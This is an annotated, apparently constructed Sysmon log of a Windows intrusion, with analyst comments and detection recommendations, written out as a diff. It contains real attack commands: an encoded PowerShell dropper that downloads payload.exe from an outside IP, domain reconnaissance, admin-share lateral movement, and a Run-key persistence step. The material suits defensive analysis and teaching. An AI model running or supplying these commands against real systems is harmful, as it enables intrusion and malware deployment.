@@ -1,0 +1,243 @@
+# Sysmon Process Creation Log — Sanitized
+# Host: WORKSTATION-04 (Windows 10 Enterprise, Build 19045)
+# EventID: 1 (Process Creation)
+# Window: 2024-03-14 02:17:43 UTC to 2024-03-14 02:30:00 UTC
+# Source: Microsoft-Windows-Sysmon/Operational
+# -----------------------------------------------------------------------
+# NOTE: Hashes sanitized except for the malicious file.
+#       User account and hostnames are fictional.
+# -----------------------------------------------------------------------
+
+
+# ===================================================================
+# STAGE 1 — INITIAL RECON (attacker explores the system)
+# ===================================================================
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Source:        Microsoft-Windows-Sysmon
+Date:          2024-03-14 02:18:05 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  RuleName:         -
+  UtcTime:          2024-03-14 02:18:05.331
+  ProcessGuid:      {4A3B2C1D-E5F6-7890-ABCD-EF1234567801}
+  ProcessId:        3912
+  Image:            C:\Windows\System32\cmd.exe
+  FileVersion:      10.0.19041.1 (legitimate Windows binary)
+  Description:      Windows Command Processor
+  CommandLine:      cmd.exe /c whoami /all
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonGuid:        {A4F3B2C1-D5E6-7890-ABCD-EF1234567890}
+  LogonId:          0x9F3A41      <- Matches Logon ID from EventID 4624 at 02:17:43
+  TerminalSessionId: 0
+  IntegrityLevel:   Medium
+  ParentProcessGuid: {1B2C3D4E-F5A6-7890-BCDE-F23456789012}
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  ParentCommandLine: cmd.exe
+  # ⚠️ LogonId 0x9F3A41 links this directly to the attacker's network session
+
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:18:22 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  ProcessId:        3924
+  Image:            C:\Windows\System32\net.exe
+  CommandLine:      net user /domain
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonId:          0x9F3A41
+  IntegrityLevel:   Medium
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  ParentCommandLine: cmd.exe
+  # ⚠️ Domain user enumeration — mapping the environment
+
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:18:41 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  ProcessId:        3937
+  Image:            C:\Windows\System32\net.exe
+  CommandLine:      net group "Domain Admins" /domain
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonId:          0x9F3A41
+  IntegrityLevel:   Medium
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  # ⚠️ Checking membership of Domain Admins — privilege mapping
+
+
+# ===================================================================
+# STAGE 2 — PAYLOAD DOWNLOAD (encoded PowerShell dropper)
+# ===================================================================
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:19:10 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  ProcessId:        3981
+  Image:            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  CommandLine:      powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
+                    -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0
+                    ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEA
+                    MAAxAC4ANAAgADcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAGUAeABl
+                    ACAALQBPAHQAUAB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAGoA
+                    cwBtAGkAdABoAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBt
+                    AHAAXABwAGEAeQBsAG8AYQBkAC4AZQB4AGUA
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonId:          0x9F3A41
+  IntegrityLevel:   Medium
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  Hashes:           MD5=legitimate,SHA256=legitimate
+  # ⚠️ -WindowStyle Hidden + -ExecutionPolicy Bypass + -EncodedCommand = dropper
+  # Decoded command:
+  #   Invoke-WebRequest -Uri http://185.220.101.47:8080/payload.exe
+  #   -OutFile C:\Users\jsmith\AppData\Local\Temp\payload.exe
+
+
+# ===================================================================
+# STAGE 3 — LATERAL MOVEMENT (SMB file copy to FILESERVER-01)
+# ===================================================================
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:21:33 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  ProcessId:        4012
+  Image:            C:\Windows\System32\net.exe
+  CommandLine:      net use \\FILESERVER-01\C$ /user:CORP\jsmith [REDACTED]
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonId:          0x9F3A41
+  IntegrityLevel:   Medium
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  # ⚠️ Mapping admin share on FILESERVER-01 with explicit credentials
+
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:21:55 UTC
+Event ID:      1
+Computer:      WORKSTATION-04
+
+Process Create:
+  ProcessId:        4031
+  Image:            C:\Windows\System32\cmd.exe
+  CommandLine:      cmd.exe /c copy C:\Users\jsmith\AppData\Local\Temp\payload.exe
+                    \\FILESERVER-01\C$\Windows\Temp\svchost32.exe
+  CurrentDirectory: C:\Windows\system32\
+  User:             CORP\jsmith
+  LogonId:          0x9F3A41
+  IntegrityLevel:   Medium
+  ParentProcessId:  3844
+  ParentImage:      C:\Windows\System32\cmd.exe
+  # ⚠️ LATERAL MOVEMENT — payload copied to FILESERVER-01 disguised as svchost32.exe
+
+
+# ===================================================================
+# STAGE 4 — PERSISTENCE (Registry Run key on FILESERVER-01)
+# ===================================================================
+# The following entries are from FILESERVER-01 (second compromised host)
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:22:10 UTC
+Event ID:      1
+Computer:      FILESERVER-01    <- ⚠️ Second host
+
+Process Create:
+  ProcessId:        2841
+  Image:            C:\Windows\Temp\svchost32.exe
+  CommandLine:      "C:\Windows\Temp\svchost32.exe"
+  CurrentDirectory: C:\Windows\Temp\
+  User:             CORP\jsmith
+  LogonId:          0x7B2D19
+  IntegrityLevel:   Medium
+  Hashes:           MD5=a3f1c2d4e5b6789012345678abcdef01,
+                    SHA256=deadbeef1234567890abcdef1234567890abcdef1234567890abcdef9876543210
+  # ⚠️ MALWARE EXECUTED on FILESERVER-01
+  # VirusTotal: 54/72 engines — Cobalt Strike Beacon
+
+
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Date:          2024-03-14 02:24:17 UTC
+Event ID:      13   <- Registry Value Set
+Computer:      FILESERVER-01
+
+Registry value set:
+  RuleName:     -
+  UtcTime:      2024-03-14 02:24:17.882
+  ProcessGuid:  {5B4C3D2E-F6A7-8901-CDEF-234567890123}
+  ProcessId:    2841
+  Image:        C:\Windows\Temp\svchost32.exe
+  TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper
+  Details:      C:\Windows\Temp\svchost32.exe
+  # ⚠️ PERSISTENCE — Run key planted by the malware itself
+  # Survives reboots — svchost32.exe will auto-start with Windows
+
+
+# ===================================================================
+# SECTION 5: PROCESS TREE SUMMARY (Visual)
+# ===================================================================
+#
+# WORKSTATION-04 (attacker session — LogonId 0x9F3A41)
+#
+#  cmd.exe [PID 3844]          <- attacker's initial shell via SMB
+#  ├── cmd.exe /c whoami /all               [02:18:05]  recon
+#  ├── net.exe user /domain                 [02:18:22]  recon
+#  ├── net.exe group "Domain Admins"        [02:18:41]  recon
+#  ├── powershell.exe -Hidden -Encoded ...  [02:19:10]  ⚠️ payload download
+#  │     Decoded: Invoke-WebRequest → downloads payload.exe from C2
+#  ├── net.exe use \\FILESERVER-01\C$       [02:21:33]  ⚠️ maps admin share
+#  └── cmd.exe /c copy payload.exe → svchost32.exe  [02:21:55]  ⚠️ LATERAL MOVE
+#
+# FILESERVER-01 (second compromised host — LogonId 0x7B2D19)
+#
+#  svchost32.exe [PID 2841]    [02:22:10]  ⚠️ COBALT STRIKE BEACON
+#  └── (EventID 13) Registry Run key planted  [02:24:17]  ⚠️ PERSISTENCE
+
+
+# ===================================================================
+# SECTION 6: PROCESS STATISTICS
+# ===================================================================
+
+Metric                                     Value
+-----------------------------------------  --------------------------------
+Total suspicious processes (WORKSTATION)   6
+Total suspicious processes (FILESERVER)    1
+Encoded PowerShell executions              1
+net.exe calls (recon + lateral move)       3
+Hosts affected                             2  (WORKSTATION-04, FILESERVER-01)
+Malware instances executed                 1  (svchost32.exe, PID 2841)
+Registry persistence events (EventID 13)  1
+Logon session linked (0x9F3A41)            All WORKSTATION-04 processes
+Logon session linked (0x7B2D19)            All FILESERVER-01 processes
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - LogonId field is the key pivot — links every process to the 02:17:43 logon
+# - powershell.exe with -Hidden -Bypass -Encoded is a tier-1 detection rule
+# - net.exe calling admin shares (C$, ADMIN$) = lateral movement indicator
+# - svchost32.exe in C:\Windows\Temp\ is suspicious — real svchost.exe lives
+#   in C:\Windows\System32\ only
+# - Sysmon EventID 13 (Registry Set) caught the persistence before any reboot
+# - Recommend: Alert on powershell.exe with -EncodedCommand from non-admin users
+# - Recommend: Alert on net.exe mapping C$ or ADMIN$ shares
+# - Recommend: File name rule — any executable named svchost*.exe outside System32
+# -----------------------------------------------------------------------
